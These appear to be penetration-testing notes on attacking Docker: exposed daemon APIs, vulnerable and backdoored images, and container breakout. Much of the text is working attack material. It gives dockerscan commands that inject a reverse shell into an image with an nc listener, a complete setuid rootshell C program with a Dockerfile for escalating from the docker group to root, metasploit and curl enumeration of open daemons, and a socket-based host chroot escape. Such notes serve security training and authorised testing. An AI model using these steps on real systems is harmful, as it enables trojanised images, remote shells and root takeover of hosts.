- [Background Information](#background-information)
  - [Attack Surface](#attack-surface)
  - [Exploiting Vulnerable Images](#exploiting-vulnerable-images)
  - [Backdooring Docker Images](#backdooring-docker-images)
  - [Docker Daemon Misconfigurations](#docker-daemon-misconfigurations)
    - [Enumerating Docker daemon](#enumerating-docker-daemon)
    - [Docker Host Privilege Escalation](#docker-host-privilege-escalation)
    - [Searching for Secrets](#searching-for-secrets)
  - [Privilege Escalation and Container Breakout](#privilege-escalation-and-container-breakout)
    - [Manual methods](#manual-methods)
      - [Mounted docker socket](#mounted-docker-socket)
      - [Abusing Linux Capabilities](#abusing-linux-capabilities)
      - [--Privileged Flag](#--privileged-flag)
      - [Writeable HostPath mount](#writeable-hostpath-mount)
    - [Automated tools](#automated-tools)
  - [References](#references)

# Background Information

## Attack Surface

Typically within an organisation docker will not be running as a standalone service but as part of a cluster via a container orchestration tool - commonly Kubernetes or Docker Swarm. In this situation the attack surface is increased and other vectors will be introduced - For further information see Pentesting Kubernetes notes. 

Docker attack entrypoints:
- External attackers - Attempt to gain an initial foothold onto a container by exploiting an application running inside the container, i.e. vulnerable to RCE.
- Internal attackers / malicious insiders - Authenticated users with docker privileges or host access can abuse permissions and misconfigurations.
- Compromised containers - Known vulnerabilities and misconfigurations within container images can provide shell access, privilege escalation and container breakout vectors.

## Exploiting Vulnerable Images
Docker images can be downloaded from public repositories such as docker hub, anyone can create a free account and upload images to this repo and these images can contain vulnerabilities either intentionally or not. As docker images are built on layers there may also be vulnerabilities within the underlying layers - OS and dependancies - as well as the application. 

Organisations should restrict pulling images to only private internal repositories, however it may still be possible to pull from docker hub if not properly locked down.

An intentionally vulnerable image can be found at https://hub.docker.com/r/vulnerables/cve-2014-6271 this image is vulnerable to shellshock and can be used as a POC to show how exploiting an a vulnerability can lead to RCE into a container - Note this is a vulnerable image and should only be used for training purposes.

## Backdooring Docker Images
It is possible to backdoor images manually, however The `Dockerscan` tool makes it easy to inject a reverse shell into a docker image. This docker image will still have the tag `latest` and the creation date will not be modified - the only way to detect it would be to inspect the image or diff the hash.

Install and setup dockerscan:
```
git clone https://github.com/cr0hn/dockerscan.git
Python install setup.py
export LC_ALL=C.UTF-8
export LANG=C.UTF-8
```

Save the victim docker image, install the trojan and import to docker: 

```
docker pull alpine # pull the image if not local
docker save alpine -o alpine-original # save the docker file 
dockerscan image modify trojanize alpine-original -l 172.17.0.1 -p 9001 -o alpine-trojan
docker load -i alpine-trojan.tar # load the output into docker
```
Now that the trojanized image is imported to docker, if the victim runs a docker container from it, the reverse shell can be captured with nc, e.g -  `nc -nlvp 9001`

## Docker Daemon Misconfigurations

The daemon listens on unix:///var/run/docker.sock but you can bind Docker to another host/port or a Unix socket.

The daemon can be configured for remote access, by default, the remote API listens on port 2375 and 2376 for unencrypted and encrypted communication. By default the service does not require authentication allowing an attacker to start a privileged docker container - gaining root access to any containers. By using the Remote API you can attach hosts / (root directory) to the container and read/write files of the host’s environment.

### Enumerating Docker daemon

- Using Nmap
```
nmap -p 2375,2376 <IP> 

nmap -p- -sV --script docker-* <IP>
```

- Using Metasploit
```
msf> use exploit/linux/http/docker_deamon_tcp
```

- Using Curl
```
#check version
curl -s http://open.docker.socket:2375/version | jq

#list containers
curl -insecure https://tlsopen.docker.socket:2376/containers/json | jq
```

- Using Docker binary
```
docker -H open.docker.socket:2375/version
```

Further information regarding abusing docker sockets can be found here:
https://securityboulevard.com/2019/02/abusing-docker-api-socket/

### Docker Host Privilege Escalation
The Docker daemon runs with root privlieges to perform operations, generally users will add themselves to the docker group instead of running as root. However it is possible to leverage docker volumes and suid binaries to escalate a user with docker group access to root. Full information can be found at https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/. 

Quick guide:

Create the following files
- dockerfile
```
FROM alpine:3.5
COPY root.sh root.sh
COPY rootshell rootshell
```
- rootshell.c
```
int main()
{
   setuid( 0 );
   system( "/bin/sh" );
   return 0;
}
```
- root.sh
```
#!/bin/sh

cp rootshell /persist/rootshell
chmod 4777 /persist/rootshell
```

Exploitation:
- Compile rootshell.c
- Build the dockerfile - `docker build --rm -t privesc .`
- Run the dockerfile mounting a share - `docker run -v /tmp/persist:/persist privesc:latest /bin/sh root.sh`
- navigate to share on host - `cd /tmp/persist`
- execute the suid binary `./rootshell`

### Searching for Secrets
https://github.com/JOSHUAJEBARAJ/docker-secrets

## Privilege Escalation and Container Breakout
### Manual methods
#### Mounted docker socket
Though rare, if for some reason the application needs to connect to a docker socket it may be mounted to the container and can be used to escape:
```
find / -name docker.sock 2>/dev/null
# usually /run/docker.sock
```
you can communicate with the docker daemon using the docker binary or curl to execute docker commands
```
docker images # list images
docker run -ti -v /:/host/ <image> chroot /host/ bash
# use docker -H unix:///path/to/docker.sock if daemon is not a different location
```
#### Abusing Linux Capabilities
By default docker assigns several linux capabilities to containers, it is possible to enumerate and exploit these capabilities. For more information read [hacktricks - linux capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#capabilities)

#### --Privileged Flag
Privileged containers in Docker are containers which have all of the root capabilities of a host machine, allowing the ability to access resources which are not accessible in ordinary containers. It’s notable to mention that other isolation techniques such as cgroups, AppArmor, and SECcomp are also renounced or disabled.

#### Writeable HostPath mount
Hostpath mounts by definition mount a directory of the host to a container. You should check to see if there are any risky mount paths that could provide access to sensitive files (secrets, kubeconfigs, tokens etc...), if it's possible to write to the hostpath you may be able to drop an SSH key on the host and breakout.




### Automated tools 
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - can also enumerate containers  
- [Amicontained](https://github.com/genuinetools/amicontained) - Container introspection tool. Find out what container runtime is being used as well as features available.
- [Deepce](https://github.com/stealthcopter/deepce) - Docker Enumeration, Escalation of Privileges and Container Escapes
- [CDK - Container Penetration Toolkit](https://github.com/cdk-team/CDK#installationdelivery) - open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency
- [Grype](https://github.com/anchore/grype) - Vulnerability scanner for containers, can be used to find CVE's

## References

https://github.com/cr0hn/dockerscan

https://www.trendmicro.com/en_gb/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html

https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/